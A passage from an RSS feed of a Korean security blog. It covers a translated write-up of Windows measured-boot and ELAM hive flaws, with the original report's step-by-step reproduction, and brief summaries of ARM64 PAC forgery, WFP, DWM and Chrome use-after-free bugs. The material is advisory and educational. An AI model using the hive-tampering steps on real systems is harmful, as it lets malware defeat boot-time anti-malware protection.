smaller than that, but the hash calculation doesn<span class="hljs-number">&#x27;</span>t reach the modified bytes of actual value data).Under any specific condition defined above, changing offsets to value data segments <span class="hljs-keyword">or</span> changing value data segments respectively won<span class="hljs-number">&#x27;</span>t be noticed during the measurement. (Since the hash is calculated over the internals of the hive file, but <span class="hljs-keyword">not</span> over the actual value data.)Since the ELAM hive isn<span class="hljs-number">&#x27;</span>t loaded after the boot, a malicious usermode program can open it <span class="hljs-keyword">and</span> alter its data in any way possible (<span class="hljs-keyword">this</span> is <span class="hljs-keyword">not</span> limited to registry functions exposed by the Advapi32 library, the hive file can be opened <span class="hljs-keyword">and</span> edited in a HEX editor), thus exploiting any pre-existing condition defined above.## Possible solutionHandle the CM_BIG_DATA structure when parsing a registry value <span class="hljs-keyword">using</span> the Windows loader.</code></pre><p>취약점의 관련 스크린샷은 아래에 첨부되어 있다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2013.png" alt="measured-boot-vuln/Untitled%2013.png"></p><blockquote><p>01-elam-blob.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2014.png" alt="measured-boot-vuln/Untitled%2014.png"></p><blockquote><p>02-elam-blob-measured.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2015.png" alt="measured-boot-vuln/Untitled%2015.png"></p><blockquote><p>03-elam-blob-altered.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2016.png" alt="measured-boot-vuln/Untitled%2016.png"></p><blockquote><p>04-elam-blob-altered-measured.png</p></blockquote><h2 id="CVE-2021–27094"><a href="#CVE-2021–27094" class="headerlink" title="CVE-2021–27094"></a>CVE-2021–27094</h2><p>이 취약점은 앞서 소개된 취약점보다 조금 복잡하다.<br>Windows Loader 또는 Windows Kernel에서는 하이브를 로드할 때 형식 위반이 있는지 확인한다. 이 검사는 Windows Loader에 의해 로드된 하이브에 대해 두 번 수행한 뒤 메모리의 Windows Kernel로 전달된다 (ELAM 하이브 포함).</p><p>이 검사 로직은 Windwos Loader와 Kernel이 유사하게 구현되었지만 차이점이 존재한다. 그중 하나가 Windows Loader는 하위 키 목록에 있는 요소의 사전 순 정렬을 확인하지 않는다는 것이다.</p><p>ELAM 하이브는 Windows Kernel에 의해 시작된 ELAM 드라이버에서 사용되므로 Windows Loader의 ELAM blob 측정과 ELAM 드라이버 사용 사이의 사전 순 정렬 검사가 삽입된다. Windows Loader에서 측정한 후 ELAM 드라이버에서 사용하기 전 ELAM blob을 포함하는 레지스트리 키를 임의 삭제하기 위해 이 검사 프로세스의 취약점을 이용할 수 있다.</p><p>공격자는 하이브를 마운트 한 다음 표준 API를 호출해 루트 키 아래에 있는 ELAM 하이브에 빈(값이 없는) 키를 삽입할 수 있다. 그리고 Windows Kernel이 측정된 ELAM blob이 존재하는 키를 삭제하도록 유도해야 하는데, 이는 공격자가 키 삽입 후 하이브의 마운트를 해제하고 HEX 편집기로 하이브 파일의 키 목록의 순서를 임의로 변경해 사전 순 정렬을 깨는 것으로 달성할 수 있다. </p><blockquote><p>역자:<br>하이브 마운트 → 표준 API로 빈 키 생성 → 마운트 해제 → 하이브 파일의 키 순서 변경<br>으로 나타낼 수 있습니다.</p></blockquote><br>위 설명의 예시는 아래 ELAM 하이브의 레이아웃을 살펴보면 이해가 쉽다.<ol><li>Key: Windows Defender<ul><li>Value: Measured</li></ul></li><li>Key: zz<ul><li>No values</li></ul></li></ol><blockquote><p>키 순서는 루트 키의 하위 키 목록에있는 키 노드 오프셋 순서를 반영</p></blockquote><p>위는 표준 API 호출을 사용해 “zz” 키를 삽입한 정상적인 레이아웃이다. 공격자는 원하는 다음 레이아웃을 얻기 위해 하위 키 목록을 수정해야 한다.</p><ol><li>Key: zz<ul><li>No values</li></ul></li><li>Key: Windows Defender<ul><li>Value: Measured</li></ul></li></ol><blockquote><p>하위 키 목록에서 두 요소의 순서를 반대로하면 취약점을 트리거할 수 있다.</p></blockquote><br>이제 사전 순 정렬이 깨졌다. <pre><code class="hljs c">Upcase(<span class="hljs-string">&quot;zz&quot;</span>) &gt; Upcase(<span class="hljs-string">&quot;Windows Defender&quot;</span>)</code></pre><p>Windows Kernel은 사전 순 정렬이 깨졌으므로 ELAM 드라이버에서 사용하기 전에 “Windows Defender”키를 삭제한다. 그러나 Windows Loader는 이러한 손상을 인식하지 못하고, 측정할 값이 없는 “zz”키를 건너뛰어 이미 삭제된 “Windows Defender” 키에 있는 “Measured”값을 측정한다. </p><p>결과적으로 이는 ELAM blob이 ELAM 드라이버가 실행되기 전에 삭제될 수 있음을 보여준다.</p><h3 id="Root-cause"><a href="#Root-cause" class="headerlink" title="Root cause"></a>Root cause</h3><p>이 취약점은 Windows Loader가 하위 키 목록에 있는 요소의 사전 순 정렬을 확인하지 않기 때문에 발생한다.</p><p>유니코드 형식의 키 이름이 허용되고, Windows Loader에는 적절한 대소문자 테이블(문자를 대문자로 변환하는 데 사용되는 테이블)이 없어 대소문자를 구분하지 않는 사전 순 정렬을 수행하지 못한다. 따라서 Windows Loader의 해당 기능이 의도적으로 제거된 것이 취약점이 발생한 원인이 되었다.</p><p>유니 코드 대문자 테이블은 Windows Kernel에서 사용되기 때문에 사전 순 정렬은 Kernel에서 구현되었다. 또한 Loader에서 완화된 검사로 인해 Kernel 이전에 로드된 하이브에 대한 검사까지 두 번 수행해야 한다.<br>흥미롭게도, 현재 구현으로는 유니 코드 문자에 대해 리팩토링 할 수 있지만 NLS 테이블을 로드하기 전에 SYSTEM 하이브를 로드해야 한다. </p><h3 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h3><p>Microsoft는 Windows Loader에 사전 순 정렬 검사를 도입하여 취약점을 패치했다. 유니 코드 대문자 테이블은 Windows Loader에서 사용되지 않으므로 ASCII 문자를 사용하는 키 이름으로만 제한된다. 현재 키 이름에 ASCII 문자 외의 형식을 사용하는 ELAM 드라이버는 없는 것으로 확인된다.</p><p>이러한 패치는 SYSTEM 하이브를 검사할 때 심각한 데이터 손상 문제의 원인이 된다. SYSTEM 하이브는 ELAM 하이브와 마찬가지로 초기 부팅 중에 로드되나 ASCII 문자 외 형식의 키를 포함할 수 있다.</p><p>Windows Loader의 유니코드 비교 함수는 유니코드 대문자 테이블을 사용하지 않기 때문에 ASCII 외의 문자를 확인할 수 있는 방법이 없다. 아래 코드는 Windows Kernel에서 두 개의 키 이름 (대소 문자 구분 없음)을 비교하는 데 사용된다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2017.png" alt="measured-boot-vuln/Untitled%2017.png"></p><blockquote><p>유니 코드 문자열을 비교하는 데 사용되는 함수</p></blockquote><p>코드를 보면 알 수 있듯이 “z”(“a”+ 0x19) 보다 높은 코드를 가진 문자의 경우 변환이 수행되지 않는다. 예를 들어 해당 코드에서는 “я”의 대문자 버전은 “Я”이 아니라 “я”이 된다.</p><p>Windows Kernel에서 구현된 동일한 함수는 유니 코드 대문자 테이블을 사용하므로 “я”의 대문자 버전은 “Я”로 정상적으로 변환이 된다. SYSTEM 하이브 내의 하위 키 목록에 있는 요소는 이에 따라 정렬되나 부팅하는 동안에는 Windows Loader의 함수를 사용하여 확인한다.</p><p>따라서 Windows Loader는 올바르게 정렬된 하위 키 목록을 손상된 것으로 간주해 레지스트리 키를 삭제한다.</p><p>해당 이슈를 재현하려면 동일한 상위 레지스트리 키 아래의 SYSTEM 하이브에서 이름이 “я1”및 “Я2”인 두 개의 레지스트리 키를 만든 다음 컴퓨터를 재부팅하면 된다.  Windows Kernel에서는 하위 키 목록이 다음과 같이 정렬된다.</p><ol><li><em>я1</em></li><li><em>Я2</em></li></ol><p>Windows Loader에서는 아래와 같이 인식한다. Loader는 이러한 정렬을 손상된 것으로 인식해 부팅 후 “Я2”키가 삭제되는 것을 확인할 수 있다.</p><pre><code class="hljs c">Upcase (<span class="hljs-string">&quot;я1&quot;</span>)&gt; Upcase (<span class="hljs-string">&quot;Я2&quot;</span>), Upcase (<span class="hljs-string">&quot;я1&quot;</span>) = <span class="hljs-string">&quot;я1&quot;</span></code></pre><p>Microsoft는 취약점을 확인했지만 범위를 벗어났다는 이유로 업데이트하지 않았다.</p><h3 id="Original-vulnerability-report-1"><a href="#Original-vulnerability-report-1" class="headerlink" title="Original vulnerability report"></a>Original vulnerability report</h3><pre><code class="hljs c"># SummaryA malicious usermode program can modify the ELAM hive (&quot;C:\Windows\System32\config\ELAM&quot;), so its blobs (registry values called &quot;Measured&quot;, &quot;Policy&quot;, and &quot;Config&quot;) are correctly measured on the next boot, but the ELAM driver won&#x27;t see them because registry keys containing these blobs are deleted by the NT kernel (even before the BOOT_DRIVER_CALLBACK_FUNCTION callback is registered). This results in proper (expected) PCR values but registry values (the ones previously measured) are absent when the ELAM driver tries to read them. So, the system will boot without proper ELAM signatures and this won&#x27;t affect the measured boot.# Description## Steps to reproduce(Screenshots attached.)<span class="hljs-number">1.</span> Mount the ELAM hive <span class="hljs-keyword">using</span> a registry editor.2. Add the &quot;zz&quot; key under the root key of the ELAM hive, don&#x27;t assign any values to this key (see: &quot;01-regedit.png&quot;).<span class="hljs-number">3.</span> Unmount the ELAM hive.4. Open the ELAM hive file in a HEX editor (you can open it because it&#x27;s not loaded), locate the subkeys list (subkeys of the root key), move the &quot;zz&quot; key to the first position on that list. (A key that was the first one before the move should now occupy the second position on the list. If there are three subkeys, just exchange the first and last keys on the list.)The idea is to <span class="hljs-keyword">break</span> the lexicographical order of subkeys. So, <span class="hljs-string">&quot;1 2&quot;</span> becomes <span class="hljs-string">&quot;2 1&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;1 2 3&quot;</span> becomes <span class="hljs-string">&quot;3 2 1&quot;</span> (see: <span class="hljs-string">&quot;02-hexeditor-intact.png&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;03-hexeditor-modified.png&quot;</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;before&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;after&quot;</span> states of the hive file respectively).<span class="hljs-number">5.</span> Reboot the system.6. When the Windows loader (winload.exe or winload.efi) reads the ELAM hive, it doesn&#x27;t check the lexicographical order of subkeys (see: &quot;04-leaf-as-loaded-by-winload.png&quot;). It&#x27;s okay for the Windows loader if subkeys are stored in a wrong order.7. When the Windows loader measures the ELAM hive (in the OslpMeasureEarlyLaunchHive routine), it reads subkeys one-by-one and measures their values (called &quot;Measured&quot;, &quot;Policy&quot;, and &quot;Config&quot;).8. If you manage to break the lexicographical order of subkeys by inserting empty keys and keeping real (non-empty) keys in the same order (relative to each other, not counting the empty keys), then the Windows loader will measure the usual (expected) data. This can be easily demonstrated with one key – &quot;Windows Defender&quot;. If you insert the <span class="hljs-string">&quot;zz&quot;</span> key <span class="hljs-keyword">using</span> a registry editor, it goes to the end of the subkeys <span class="hljs-built_in">list</span>. Like <span class="hljs-keyword">this</span>:- Windows Defender- zzIf you move the &quot;zz&quot; key to the top (using a HEX editor), the lexicographical order is broken, but since the &quot;zz&quot; key has no values, it doesn&#x27;t get measured. And the &quot;Windows Defender&quot; is measured as usual.9. When the NT kernel starts, it takes hives attached to the loader parameter block and validates them. At this point, the validation routine checks the lexicographical order. If a subkeys list isn&#x27;t sorted, offending keys are removed from the list (see: &quot;05-leaf-as-loaded-by-kernel.png&quot;, &quot;06-leaf-as-loaded-by-kernel.png&quot;, and &quot;07-leaf-after-check-by-kernel.png&quot;). This means that the <span class="hljs-string">&quot;Windows Defender&quot;</span> key from the example above is removed.10. When the ELAM driver tries to locate its signatures, they are gone – they were removed by the NT kernel because of the hive format violation (see: &quot;08-leaf-as-seen-by-elam.png&quot;).## Possible solutionsEither check the lexicographical order of subkeys in the Windows loader (which requires you to pick the NLS tables first) or measure empty keys together with non-empty ones.</code></pre><p>취약점의 관련 스크린샷은 아래에 첨부되어 있다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2018.png" alt="measured-boot-vuln/Untitled%2018.png"></p><blockquote><p>01-regedit.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2019.png" alt="measured-boot-vuln/Untitled%2019.png"></p><blockquote><p>02-hexeditor-intact.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2020.png" alt="measured-boot-vuln/Untitled%2020.png"></p><blockquote><p>03-hexeditor-modified.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2021.png" alt="measured-boot-vuln/Untitled%2021.png"></p><blockquote><p>04-leaf-as-loaded-by-winload.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2022.png" alt="measured-boot-vuln/Untitled%2022.png"></p><blockquote><p>05-leaf-as-loaded-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2023.png" alt="measured-boot-vuln/Untitled%2023.png"></p><blockquote><p>06-leaf-as-loaded-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2024.png" alt="measured-boot-vuln/Untitled%2024.png"></p><blockquote><p>07-leaf-after-check-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2025.png" alt="measured-boot-vuln/Untitled%2025.png"></p><blockquote><p>08-leaf-as-seen-by-elam.png</p></blockquote><hr>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/boot-security/">boot security</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/27/l0ch/measured-boot-vuln/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] PAC와 PAC Forgery</title>
      <link>https://hackyboiz.github.io/2021/06/27/j0ker/2021-06-27/</link>
      <guid>https://hackyboiz.github.io/2021/06/27/j0ker/2021-06-27/</guid>
      <pubDate>Sun, 27 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://blog.ret2.io/2021/06/16/intro-to-pac-arm</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><p><a href="https://blog.ret2.io/2021/06/16/intro-to-pac-arm64/">https://blog.ret2.io/2021/06/16/intro-to-pac-arm64/</a> </p></li><li><p><a href="https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf">https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf</a></p></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&gt; ARMv8.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Fabu1ous님이 말도 없이 제가 하루한줄로 쓰려던 주제를 어제 써버리는 바람에… 오늘은 <code>PAC</code>와 <code>PAC Forgery</code>에 대해서 간단하게 알아보도록 하겠습니다.</p><p><code>PAC</code>는 <code>Pointer Authentication Code</code>의 약자로, 말 그대로 포인터들을 인증하는 미티게이션 기법입니다. <code>ARMv8.3-A</code>부터 지원하며 iOS에서 이 미티게이션을 지원하면서 익스플로잇 난이도가 많이 올라갔다고 합니다.</p><blockquote><p>예… 저는 안해봐서 얼마나 어려운지 모르겠네요…?</p></blockquote><p>안드로이드에서도 지원을 하는지 여부는 제대로 확인을 못해봤습니다. <code>ARMv9</code>로 나오는 Cortex CPU에서 <code>PAC</code>를 지원하는 <a href="https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/first-armv9-cpu-cores">기사</a>를 봤는데, 혹시 아시는 분이 있으면 댓글 달아주세요 ㅜㅜ</p><p><code>PAC</code>가 동작하는 방식은 매우 “간단”합니다.</p><p>먼저, pac로 시작하는 명령어(ex. <code>paciasp</code>, <code>pacia</code>)를 통해 context와 key 그리고 해당 포인터를 이용해 sign을 합니다. 이 때, key는 128비트 값이며 시스템 레지스터에 저장되어 있는데, 일단 유저 권한에서는 당연히 접근할 수 없습니다. context는 64비트 값을 사용합니다. <code>paciasp</code>를 사용하여 PAC를 생성할 경우, 스택 포인터를 사용합니다.(<code>paciasp</code>의 맨뒤가 sp인 이유)</p><p>그리고 이 세 개의 값은 특정 알고리즘으로 계산되어 PAC를 생성할 수 있는데, 기본적으로 <a href="https://eprint.iacr.org/2016/444.pdf">QARMA</a>를 사용하고 CPU 제조사마다 커스텀이 가능합니다. 이렇게 생성된 <code>PAC</code>는 sign하려고 한 포인터의 상위 주소에 저장됩니다.</p><p>Sign한 뒤, 해당 포인터를 사용할 때에는 먼저 aut로 시작하는 명령어를 사용하여 해당 포인터가 변조되었는지를 확인합니다. 똑같이 포인터 값과 context 그리고 key 값을 사용해 해당 포인터가 정상인지를 검증합니다. 따라서 userspace에서는 <code>PAC</code>생성 알고리즘에서 사용하는 key와 context뿐만 아니라 <code>PAC</code>를 생성하는 알고리즘을 알고 있어야만 알고리즘에 부합하는 값을 얻어낼 수 있습니다.</p><p><code>PAC Forgery</code>는 key와 알고리즘 없이 이를 우회하는 기법입니다.</p><p>첫 번째 블로그의 예시 문제에서는 간단한 버퍼 오버플로우를 통해 <code>LR</code>을 조작할 수 있습니다. 이 문제는 ASLR이 걸려있지 않기 때문에 PAC 생성에 사용되는 스택 주소는 디버깅을 통해 알 수 있습니다.</p><p>그리고 <code>sign_contract()</code>함수를 살펴보면 <code>pacia</code> 명령어를 이용해 특정 레지스터에 대한 PAC를 생성합니다. 이처럼 사용자가 활용할 수 있는 <code>pacia</code> 명령어가 존재하고 context를 알고 있다면 원하는 <code>PAC</code> 코드를 생성할 수 있습니다. 그러면 이런 기능을 활용하여 점프하고 싶은 주소에 대한 <code>PAC</code> 코드를 생성하고 <code>LR</code>에 넣으면 원하는 주소로 점프하여 익스플로잇을 할 수 있게 됩니다.</p><p>다만, 해당 예시 문제는 <code>pacia</code>를 자유롭게 활용할 수 있는 상황이고 <code>ASLR</code>이 안 걸려 있어 익스플로잇하기 매우 쉬운 상황입니다. 리얼월드에서는 기본적으로 <code>information leak</code> 취약점과 pac 명령어들을 활용하는 취약점이 있어야하기 때문에 기본적으로 두개의 취약점을 가지고 있어야 익스플로잇을 해볼 수 있습니다. 이래서 어려운건지 모르겠네요. 언젠가는 제가 직접 익스플로잇을 해보면서 이에 대해 설명하는 글을 써보도록 하겠습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/arm64/">arm64</category>
      
      <category domain="https://hackyboiz.github.io/tags/pac/">pac</category>
      
      <category domain="https://hackyboiz.github.io/tags/pointer-authentication/">pointer authentication</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/27/j0ker/2021-06-27/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-31970: Windows Filtering Platform EoP</title>
      <link>https://hackyboiz.github.io/2021/06/26/fabu1ous/2021-06-26/</link>
      <guid>https://hackyboiz.github.io/2021/06/26/fabu1ous/2021-06-26/</guid>
      <pubDate>Sat, 26 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2175">Windows Filtering Platform Token Access Check EoP</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10 20H2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Filtering Platform(WFP)의 TCP/IP 드라이버는 token impersonation level에 대한 검증 미흡으로 발생하는 방화벽 정책 우회 및 권한상승 취약점이 패치되었습니다. </p><p>WFP는 네트워크 필터링을 생성하기 위한 API 및 시스템 서비스들입니다. 소캣에 작업이 들어오면 기본 필터링 엔진 및 Windows 방화벽에서 구성한 정책에 따라 작업이 허용되는지 확인하는데 그 필터링 정책은 호출자의 토큰 상태에 따라 달라집니다. 하지만 이 정책들을 다음과 같은 문제로 인해 우회할 수 있습니다.</p><ul><li><p>PsReferenceImpersonationToken을 호출해 토큰을 TOKEN_ACCESS_INFORMATION 구조체로 변환할 때 impersonation level이 SecurityImpersonation 이상인지 확인하지 않습니다.</p></li><li><p>TCP/IP 드라이버는 토큰 impersonating 도중에 소캣 생성을 허용합니다.</p></li></ul><p>일반 사용자가 시스템 토큰을 캡처하고 impersonat 할 수 있게 되므로 해커는 이를 악용해 방화벽 정책에 의해 명시적으로 허용되지 않는 작업을 수행할 수 있게 됩니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/tcpip/">tcpip</category>
      
      <category domain="https://hackyboiz.github.io/tags/wfp/">wfp</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/26/fabu1ous/2021-06-26/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-33739: Microsoft DWM core library의 권한 상승 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/25/l0ch/2021-06-25/</link>
      <guid>https://hackyboiz.github.io/2021/06/25/l0ch/2021-06-25/</guid>
      <pubDate>Fri, 25 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg&quot;&gt;https:</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg">https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 21H1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="https://ko.wikipedia.org/wiki/%EB%8D%B0%EC%8A%A4%ED%81%AC%ED%86%B1_%EC%B0%BD_%EA%B4%80%EB%A6%AC%EC%9E%90">Windows 데스크톱 창 관리자</a>(Desktop Window Manager, dwm.exe)의 <code>dwmcore.dll</code> 모듈에서 UAF로 인한 권한 상승 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p><code>dwmcore.dll</code> 모듈의 <code>CinteractionTrackerBindingManager</code> 객체는 참조 횟수(reference count)를 기준으로 해제 시점이 결정됩니다. 객체를 바인딩하는 경우<code>CInteractionTrackerBindingManager::ProcessSetTrackerBindingMode</code> 함수를 사용하고 참조 횟수가 1 증가하며, 바인딩 해제하는 경우 <code>CInteractionTrackerBindingManager::RemoveTrackerBindings</code> 함수를 사용하며 참조 횟수가 1 감소합니다. 참조 횟수가 0이 된 객체는 <code>CMILCOMBase::InternalRelease</code> 함수에 의해 해제됩니다.</p><p>취약점은 같은 객체를 바인딩하는 리소스가 <code>CinteractionTrackerBindingManager</code> 객체를 참조했을 때 발생하며 해커가 DirectComposition API를 사용해 코드 수준에서 트리거가 가능합니다.</p><ol><li><p>동일한 <code>CinteractionTrackerMarshaler</code>를 바인딩하는 두 개의 리소스가 <code>CinteractionTrackerBindingManager</code>을 참조합니다.</p></li><li><p><code>CInteractionTrackerBindingManager::ProcessSetTrackerBindingMode</code> 함수는 동일한 <code>CinteractionTrackerMarshaler</code>에 대해 한 번만 호출되어 참조 횟수는 1 증가합니다.</p></li><li><p>리소스의 사용이 종료되고 해제될 때 <code>CInteractionTrackerBindingManager::RemoveTrackerBindings</code> 함수는 각각의 리소스에 대해 두 번 호출됩니다.</p><ul><li><p>첫 호출 시 <code>CinteractionTrackerBindingManager</code> 객체의 참조 횟수가 1 감소합니다. 0이 된 경우 <code>CMILCOMBase::InternalRelease</code> 함수에 의해 해제됩니다.</p></li><li><p>두 번째 호출 시 해제된 <code>CinteractionTrackerBindingManager</code> 객체에 접근하게 되어 UAF가 트리거 됩니다.</p></li></ul></li></ol><p>공개된 PoC는 <a href="https://github.com/mavillon1/CVE-2021-33739-POC">https://github.com/mavillon1/CVE-2021-33739-POC</a> 에서 확인할 수 있으며  <code>dwmcore.dll</code> 에서는 지난 4월 <a href="https://hackyboiz.github.io/2021/04/15/idioth/2021-04-15/">out of bounds write 취약점(CVE-2021-28310)</a>이 공개되기도 했습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/25/l0ch/2021-06-25/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-30522: Google Chrome WebAudio Code Execution Vulnerability</title>
      <link>https://hackyboiz.github.io/2021/06/24/idioth/2021-06-24/</link>
      <guid>https://hackyboiz.github.io/2021/06/24/idioth/2021-06-24/</guid>
      <pubDate>Thu, 24 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.talosintelligence.com/2021/06/chrome-web-aud</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.talosintelligence.com/2021/06/chrome-web-audio.html">Vulnerability Spotlight: Code execution vulnerability in Google Web Audio API</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Google Chrome 88.0.4324.146 (Official version) (64-bit)</li><li>Google Chrome 90.0.4405.0 (Build) (64-bit)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Chrome의 WebAudio <code>blink::AudioNodeOutput::Pull</code>에서 use after-free를 통한 code execution 취약점이 발견되었습니다. 조작된 웹 사이트에 접속하면 취약점이 트리거 되어 코드가 실행됩니다.</p><p>해당 취약점은 <code>blink::AudioNodeOutput::Pull</code> 함수에서 이미 초기화 된 메모리 영역인 <code>in_place_bus</code> (AudioBus 포인터)를 제공받아 발생합니다. WebAudio <code>createGain()</code>이 호출되면 AudioNode 객체 등이 할당되어 출력에 연결됩니다. AudioNode 인터페이스의 <code>connect()</code> 메서드는 노드의 출력 중 하나를 타깃에게 연결합니다. 루프에서 <code>new Float32Array/Uint8Array</code>를 사용하여 인접한 메모리를 연속해서 할당하며 이로 인해 garbage collector가 강제적으로 작동합니다. garbage collection이 수행되는 동안 audio rendering thread는 이미 해제된 AudioNode (AudioOutput)을 참조하므로 use after-free가 발생하며 <code>blink::AudioNodeOutput::Pull</code>은 이 AudioNode 객체를 실행합니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/use-after-free/">use after free</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/google/">google</category>
      
      <category domain="https://hackyboiz.github.io/tags/webaduio/">webaduio</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/24/idioth/2021-06-24/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-20226: 리눅스 커널의 UAF 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/23/fabu1ous/2021-06-23/</link>
      <guid>https://hackyboiz.github.io/2021/06/23/fabu1ous/2021-06-23/</guid>
      <pubDate>Wed, 23 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
